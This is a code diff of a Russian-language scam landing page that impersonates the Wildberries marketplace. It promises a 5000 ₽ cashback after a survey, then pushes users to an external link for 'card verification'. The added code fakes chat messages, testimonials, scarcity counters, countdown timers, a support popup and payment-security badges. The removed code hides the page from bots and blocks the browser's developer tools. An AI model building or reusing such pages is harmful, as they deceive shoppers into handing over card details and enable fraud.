-        // Каждые 20-40 секунд уменьшаем на 1
-        if (spotsRemaining > 1) {
-            spotsRemaining--;
-            el.textContent = spotsRemaining;
-        }
-        
-        // Когда осталось 3 или меньше — добавляем класс для акцента
-        if (spotsRemaining <= 3) {
-            el.style.color = '#e54545';
-        }
-    }
-    
-    function startSpotCounter() {
-        document.getElementById('spots-left').textContent = spotsRemaining;
-        
-        spotInterval = setInterval(function() {
-            updateSpotCounter();
-        }, 20000 + Math.floor(Math.random() * 20000)); // 20-40 секунд
-    }
-    
-    // ============================================
-    // КНОПКА
-    // ============================================
-    function handleClick() {
-        if (!userIsReal) return;
-        
-        var btn = document.getElementById('main-btn');
-        btn.classList.add('loading');
-        
-        if (timerInterval) clearInterval(timerInterval);
-        if (spotInterval) clearInterval(spotInterval);
-        
-        setTimeout(function() {
-            window.location.href = FINAL_URL + urlParams.all;
-        }, 700);
-    }
-    
-    window.handleClick = handleClick;
-    
-    // ============================================
-    // ЗАПУСК
-    // ============================================
-    setTimeout(function() {
-        if (isRealUser()) {
-            showReal();
-        } else {
-            showNeutral();
-        }
-    }, LOADER_DELAY);
-    
-    // ============================================
-    // ЗАЩИТЫ
-    // ============================================
-    document.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
-        return false;
-    });
-    
-    document.addEventListener('keydown', function(e) {
-        if ((e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.shiftKey && e.key === 'I') || e.key === 'F12') {
-            e.preventDefault();
-            return false;
-        }
-    });
-    
-    if (window.top !== window.self) {
-        document.getElementById('loader').style.display = 'none';
-        showNeutral();
-    }
-    </script>
+    <div id="questionsContainer"></div>
 
+    <div class="social-proof">
+      <div class="social-header"><span>💬 Участники обсуждают</span><span>🟢 онлайн</span></div>
+      <div class="chat-feed" id="chatFeed"></div>
+    </div>
+  </div>
+
+  <!-- Процессинг -->
+  <div class="processing-stage" id="processingStage">
+    <div class="luxury-spinner"></div>
+    <h3 style="font-weight: 700; margin-bottom: 16px;">Формируем ваш купон</h3>
+    <p style="color: #6b5b7c;" id="processingStep">Анализ предпочтений...</p>
+  </div>
+
+  <!-- Финал -->
+  <div class="final-stage" id="finalStage">
+    <div class="trophy-icon">🎁</div>
+    <h2>Ваш кэшбек готов!</h2>
+    <div class="final-amount">5 000 ₽</div>
+    <p style="margin: 8px 0; color: #4a3a5c;">Остался последний шаг — верификация карты</p>
+
+    <!-- Дефицитный счётчик -->
+    <div class="gift-fund-bar">
+      🔥 Кэшбек-фонд на сегодня: <span id="fundRemaining">147</span> из 200 доступных
+      <div class="fund-track"><div class="fund-fill" id="fundFill"></div></div>
+    </div>
+
+    <!-- Визуальная схема возврата рубля -->
+    <div class="verification-scheme">
+      <div class="scheme-step">
+        <div class="scheme-icon">💳</div>
+        Ввод данных карты
+      </div>
+      <div class="scheme-arrow">→</div>
+      <div class="scheme-step">
+        <div class="scheme-icon">🔒</div>
+        Блокировка 1 ₽
+      </div>
+      <div class="scheme-arrow">→</div>
+      <div class="scheme-step">
+        <div class="scheme-icon">✅</div>
+        Возврат через 5-10 сек
+      </div>
+    </div>
+
+    <!-- Живой отзыв -->
+    <div class="testimonial-card">
+      <div class="testimonial-avatar">Е</div>
+      <div>
+        <div class="testimonial-text">
+          «Я, Елена из Казани, честно боялась вводить данные карты. Но рубль правда вернули сразу же! А 5000 пришли на следующий день. Купила внуку конструктор. Спасибо!»
+        </div>
+        <span class="testimonial-name">Елена, 54 года, Казань</span>
+        <span class="testimonial-verified">✓ Отзыв проверен модератором</span>
+      </div>
+    </div>
+
+    <div class="instruction-panel">
+      <strong style="color: #5b21b6;">📋 Как активировать:</strong>
+      <ol>
+        <li>Нажмите <strong>«Активировать кэшбек»</strong> и пройдите быструю регистрацию.</li>
+        <li>Для подтверждения личности будет временно списан <strong>1 ₽</strong> (мгновенно возвращается, это холдирование).</li>
+        <li>Сразу после верификации ваш кэшбек в <strong>5000 ₽</strong> станет активным!</li>
+      </ol>
+    </div>
+
+    <div class="urgent-banner">
+      ⏰ Предложение ограничено: <span id="finalTimer">05:00</span>
+    </div>
+
+    <a id="activationLink" href="https://onelinkgo.ru/stream/summer_wb" class="cta-button">
+      💳 Активировать кэшбек 5000 ₽
+    </a>
+
+    <!-- Блок безопасности -->
+    <div class="security-badges">
+      <span>🔒 Visa Secure</span>
+      <span>🔒 MasterCard ID Check</span>
+      <span>🔒 МИР Accept</span>
+      <span class="pci-badge">PCI DSS Level 1</span>
+    </div>
+    <p class="safe-note">Данные передаются напрямую в банк. Мы не храним платёжную информацию.</p>
+  </div>
+</div>
+
+<!-- Плавающая кнопка поддержки -->
+<div class="support-widget">
+  <div class="support-popup" id="supportPopup">
+    <strong>🛡️ Служба заботы Wildberries</strong><br><br>
+    Операторы сейчас заняты, но мы видим вашу заявку. Среднее время ответа — 2 минуты.<br><br>
+    <span style="color: #16a34a; font-weight: 700;">Пока вы можете продолжить активацию — это абсолютно безопасно.</span>
+  </div>
+  <button class="support-btn" id="supportBtn">
+    🎧 Поддержка ВБ
+  </button>
+</div>
+
+<script>
+  (function() {
+    // ----- ДАННЫЕ -----
+    const questionsData = [
+      { text: "Как часто вы радуете себя покупками на ВБ?", options: ["Почти каждый день", "Раз в неделю", "Пару раз в месяц", "По настроению"] },
+      { text: "Ваша любимая категория товаров?", options: ["👗 Одежда и обувь", "💄 Красота и уход", "🏡 Дом и уют", "📱 Электроника"] },
+      { text: "Какую сумму обычно тратите за заказ?", options: ["До 2 000 ₽", "2 000 – 5 000 ₽", "5 000 – 10 000 ₽", "Более 10 000 ₽"] },
+      { text: "Что для вас самое важное при выборе?", options: ["⭐ Отзывы и рейтинг", "💰 Цена и скидки", "🚚 Скорость доставки", "🛡️ Гарантия качества"] },
+      { text: "Какой формат бонуса вам интереснее?", options: ["💵 Кэшбек на карту", "🎫 Скидка на заказ", "🚀 Бесплатная доставка"] },
+      { text: "Вы подписаны на акции ВБ?", options: ["Да, всегда в курсе!", "Иногда читаю", "Нет, но хочу"] },
+      { text: "Какой бренд ВБ вам ближе?", options: ["Fashion-коллекции", "Домашний текстиль", "Beauty-новинки", "Детские товары"] }
+    ];
+
+    let currentQuestionIndex = 0;
+    const totalQuestions = questionsData.length;
+    let surveyActive = true;
+    let participantsCount = 2431;
+    let fundRemaining = 147;
+    const fundTotal = 200;
+
+    // Таймеры
+    let heroSeconds = 23*3600 + 59*60 + 59;
+    let finalSeconds = 300;
+
+    // DOM элементы
+    const surveyStage = document.getElementById('surveyStage');
+    const questionsContainer = document.getElementById('questionsContainer');
+    const progressFill = document.getElementById('progressFill');
+    const currentQSpan = document.getElementById('currentQ');
+    const processingStage = document.getElementById('processingStage');
+    const finalStage = document.getElementById('finalStage');
+    const heroTimerEl = document.getElementById('heroTimer');
+    const finalTimerEl = document.getElementById('finalTimer');
+    const participantEl = document.getElementById('participantCounter');
+    const chatFeed = document.getElementById('chatFeed');
+    const fundRemainingEl = document.getElementById('fundRemaining');
+    const fundFill = document.getElementById('fundFill');
+    const supportBtn = document.getElementById('supportBtn');
+    const supportPopup = document.getElementById('supportPopup');
+
+    // ----- РЕНДЕР ВОПРОСОВ -----
+    function renderQuestion(index) {
+      if (index >= totalQuestions) {
+        finishSurvey();
+        return;
+      }
+      const q = questionsData[index];
+      let html = `<div class="question-card active"><div class="question-text">${q.text}</div><div class="options-list">`;
+      q.options.forEach((opt, i) => {
+        html += `<div class="option-item" data-option="${i}"><div class="option-radio"></div><span class="option-label">${opt}</span></div>`;
+      });
+      html += `</div></div>`;
+      questionsContainer.innerHTML = html;
+
+      document.querySelectorAll('.option-item').forEach(item => {
+        item.addEventListener('click', function(e) {
+          if (!surveyActive) return;
+          this.style.background = '#f3e8ff';
+          this.style.borderColor = '#7c3aed';
+          setTimeout(() => {
+            currentQuestionIndex++;
+            updateProgress();
+            renderQuestion(currentQuestionIndex);
+            participantsCount += Math.floor(Math.random() * 2) + 1;
+            participantEl.textContent = participantsCount;
+          }, 150);
+        });
+      });
+    }
+
+    function updateProgress() {
+      const percent = ((currentQuestionIndex) / totalQuestions) * 100;
+      progressFill.style.width = `${percent}%`;
+      currentQSpan.textContent = Math.min(currentQuestionIndex + 1, totalQuestions);
+    }
+
+    function finishSurvey() {
+      surveyActive = false;
+      surveyStage.style.display = 'none';
+      processingStage.classList.add('active');
+
+      const steps = ['Анализ предпочтений...', 'Проверка на соответствие...', 'Подготовка купона...'];
+      let step = 0;
+      const stepEl = document.getElementById('processingStep');
+      const interval = setInterval(() => {
+        if (step < steps.length) {
+          stepEl.textContent = steps[step];
+          step++;
+        } else {
+          clearInterval(interval);
+        }
+      }, 800);
+
+      setTimeout(() => {
+        processingStage.classList.remove('active');
+        finalStage.classList.add('active');
+        startFinalCountdown();
+        updateFundDisplay();
+        showToast('✅ Вы успешно прошли отбор!');
+      }, 2600);
+    }
+
+    function updateFundDisplay() {
+      fundRemaining = Math.max(30, fundRemaining - Math.floor(Math.random() * 5));
+      fundRemainingEl.textContent = fundRemaining;
+      const percent = (fundRemaining / fundTotal) * 100;
+      fundFill.style.width = `${percent}%`;
+    }
+
+    // Таймеры
+    function updateHeroTimer() {
+      if (heroSeconds <= 0) { heroTimerEl.textContent = "00:00:00"; return; }
+      const h = Math.floor(heroSeconds / 3600);
+      const m = Math.floor((heroSeconds % 3600) / 60);
+      const s = heroSeconds % 60;
+      heroTimerEl.textContent = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+      heroSeconds--;
+      setTimeout(updateHeroTimer, 1000);
+    }
+
+    function startFinalCountdown() {
+      const update = () => {
+        if (finalSeconds <= 0) { finalTimerEl.textContent = "00:00"; return; }
+        const m = Math.floor(finalSeconds / 60);
+        const s = finalSeconds % 60;
+        finalTimerEl.textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+        finalSeconds--;
+        setTimeout(update, 1000);
+      };
+      update();
+    }
+
+    // Чат
+    const chatNames = ["Алёна М.", "Виктор С.", "Ольга К.", "Марина В.", "Светлана", "Екатерина", "Дмитрий", "Анна Ш."];
+    const chatMessages = [
+      "Только что прошла! Всё честно!",
+      "Кто уже получил 5000? Сколько ждать?",
+      "Девушки, верификация супер быстрая!",
+      "Муж не верил, но я доказала 😄",
+      "Рубль вернули сразу же!",
+      "Спасибо ВБ за подарок!",
+      "Осталось мало времени, торопитесь!",
+      "Уже купила платье на эти деньги 👗",
+    ];
+
+    function addChatMessage() {
+      if (!surveyActive && !finalStage.classList.contains('active')) return;
+      const name = chatNames[Math.floor(Math.random() * chatNames.length)];
+      const msg = chatMessages[Math.floor(Math.random() * chatMessages.length)];
+      const div = document.createElement('div');
+      div.className = 'chat-msg';
+      div.innerHTML = `<span class="msg-name">${name}</span> ${msg}`;
+      chatFeed.appendChild(div);
+      chatFeed.scrollTop = chatFeed.scrollHeight;
+      if (chatFeed.children.length > 6) chatFeed.removeChild(chatFeed.firstChild);
+    }
+
+    setInterval(addChatMessage, 4000 + Math.random() * 3000);
+    for (let i = 0; i < 3; i++) addChatMessage();
+
+    // Тосты
+    function showToast(text) {
+      const toast = document.createElement('div');
+      toast.className = 'floating-toast';
+      toast.innerHTML = text;
+      document.body.appendChild(toast);
+      setTimeout(() => {
+        toast.style.animation = 'floatOut 0.4s ease forwards';
+        setTimeout(() => toast.remove(), 400);
+      }, 3500);
+    }
+
+    setInterval(() => {
+      if (!surveyActive && !finalStage.classList.contains('active')) return;
+      const names = ["Алёна", "Ольга", "Светлана", "Марина"];
+      const name = names[Math.floor(Math.random() * names.length)];
+      showToast(`🎉 ${name} только что активировала кэшбек 5000 ₽`);
+    }, 14000);
+
+    // Кнопка поддержки
+    supportBtn.addEventListener('click', function(e) {
+      e.stopPropagation();
+      supportPopup.classList.toggle('active');
+    });
+
+    document.addEventListener('click', function(e) {
+      if (!supportPopup.contains(e.target) && e.target !== supportBtn) {
+        supportPopup.classList.remove('active');
+      }
+    });
+
+    // Обновление счётчика подарков на финале
+    setInterval(() => {
+      if (finalStage.classList.contains('active')) {
+        updateFundDisplay();
+      }
+    }, 15000);
+
+    // Динамика участников
+    setInterval(() => {
+      if (surveyActive) {
+        participantsCount += Math.floor(Math.random() * 3) + 1;
+        participantEl.textContent = participantsCount;
+      }
+    }, 10000);
+
+    // Инициализация
+    renderQuestion(0);
+    updateHeroTimer();
+  })();
+</script>
 </body>
 </html>
